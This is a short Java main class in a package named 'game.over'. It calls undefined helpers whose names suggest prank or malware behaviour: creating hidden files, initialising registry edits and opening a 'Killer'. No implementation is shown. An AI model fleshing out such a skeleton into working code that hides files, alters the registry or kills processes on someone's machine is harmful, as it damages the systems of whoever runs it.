package game.over;

public class Main {
    public static void main(String[] args) {
        del.stop();
        HiddenFileCreator.createHiddenFiles();
        regedit.init();
        Killer.open();
    }
}
